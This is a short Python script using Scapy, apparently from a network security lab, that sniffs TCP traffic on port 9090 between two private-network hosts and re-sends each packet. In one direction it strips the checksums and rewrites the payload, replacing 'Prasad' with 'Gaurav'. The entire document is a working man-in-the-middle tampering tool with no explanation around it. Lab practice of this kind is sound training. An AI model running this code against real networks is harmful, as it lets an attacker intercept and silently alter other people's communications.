#!/usr/bin/python3
from scapy.all import *


def spoof_packet(pkt):
	if pkt[TCP].payload and pkt[IP].src == "10.0.2.15" and pkt[IP].dst == "10.0.2.14":
		data = pkt[TCP].payload.load
		newpkt = IP(bytes(pkt[IP]))
		del(newpkt.chksum)
		del(newpkt[TCP].payload)
		del(newpkt[TCP].chksum)
		newdata = data.replace(b'Prasad', b'Gaurav')
		newpkt = newpkt/newdata
		send(newpkt)
		
	elif pkt[IP].src == "10.0.2.14" and pkt[IP].dst == "10.0.2.15":
		newpkt = pkt[IP]
		send(newpkt)

pkt = sniff(filter = "tcp and port 9090 and src (10.0.2.15 or 10.0.2.14)",
		prn = spoof_packet)

